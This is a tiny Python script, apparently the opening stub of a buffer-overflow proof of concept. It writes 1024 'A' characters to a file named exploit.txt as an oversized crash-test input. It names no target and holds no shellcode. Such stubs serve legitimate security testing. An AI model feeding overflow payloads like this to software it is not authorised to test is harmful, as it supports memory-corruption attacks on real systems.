buf = "A" * 1024

f = open("exploit.txt", "w")
f.write(buf)
f.close()
